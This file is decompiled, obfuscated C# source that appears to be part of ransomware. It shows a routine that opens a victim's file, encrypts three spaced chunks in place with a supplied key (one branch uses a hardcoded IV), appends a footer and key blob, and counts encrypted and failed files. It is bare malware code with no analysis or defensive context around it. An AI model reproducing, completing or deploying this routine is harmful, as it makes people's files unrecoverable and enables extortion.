using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using uxJZpPHZaFNzux;

namespace wDtIYaxdpawEu;

internal sealed class ubLoTFodkJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int ddiTtsyUMMsDvXH(long long_0)
	{
		return (int)long_0;
	}

	public static bool ExViKdySZgBq(string wMqsgWXclWQWeE, string TPCpCxFSwBINEz, string vMWYMfKmWKi, byte[] YtgDWQjNuk = null, byte[] PJmwEmqDAIOcM = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(wMqsgWXclWQWeE, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = ddiTtsyUMMsDvXH(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(TPCpCxFSwBINEz) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(TPCpCxFSwBINEz) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(TPCpCxFSwBINEz) * 1024 * 1024) / 10;
				}
				int cSvSBkkllwAyh = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = uGRDjiXacVjVU(wMqsgWXclWQWeE, fileStream, cSvSBkkllwAyh, num * i);
					array = (XudtxnGtRBJeB.FmiPpRhQSBxQ ? nqDlrZSqItsRF.PWhWBEuyfRKWPX(byte_, Convert.FromBase64String(vMWYMfKmWKi), PJmwEmqDAIOcM) : TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_, Convert.FromBase64String(vMWYMfKmWKi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					KswIWbZUnctWG(wMqsgWXclWQWeE, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (XudtxnGtRBJeB.IflXfWBKZN ? Encoding.ASCII.GetBytes(XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107377720)) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378704)) + Convert.ToString(TPCpCxFSwBINEz) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378704))) : Encoding.ASCII.GetBytes(XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107377720)) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378713)) + Convert.ToString(TPCpCxFSwBINEz) + XudtxnGtRBJeB.jGDSNxQzvqSx(getString_0(107378713))));
			if (!XudtxnGtRBJeB.IflXfWBKZN)
			{
				using FileStream fileStream2 = new FileStream(wMqsgWXclWQWeE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(wMqsgWXclWQWeE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(YtgDWQjNuk, 0, YtgDWQjNuk.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (XudtxnGtRBJeB.SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(XudtxnGtRBJeB.ndioqUCcjeEwRygxn, getString_0(107398067) + wMqsgWXclWQWeE + getString_0(107377707) + ex.Message + getString_0(107396661));
				}
				catch (Exception)
				{
				}
			}
			XudtxnGtRBJeB.PuPUesizAwkkz++;
			return false;
		}
		XudtxnGtRBJeB.SYFhGDZRgJn++;
		return true;
	}

	public static byte[] uGRDjiXacVjVU(string WTKJyAaCwGkFJ, FileStream zRBynkkIWdaxpd, int cSvSBkkllwAyh, int fFNmBnUENUV = 0)
	{
		byte[] array = new byte[cSvSBkkllwAyh];
		zRBynkkIWdaxpd.Position = fFNmBnUENUV;
		zRBynkkIWdaxpd.Read(array, 0, cSvSBkkllwAyh);
		return array;
	}

	public static void KswIWbZUnctWG(string iPenSLZbTbzR, FileStream WyZqWQyfgYxtCd, byte[] gtsEBBYHyFg, int BUTeRzSjCqeFa = 0)
	{
		WyZqWQyfgYxtCd.Position = BUTeRzSjCqeFa;
		WyZqWQyfgYxtCd.Write(gtsEBBYHyFg, 0, gtsEBBYHyFg.Length);
	}

	static ubLoTFodkJ()
	{
		Strings.CreateGetStringDelegate(typeof(ubLoTFodkJ));
	}
}
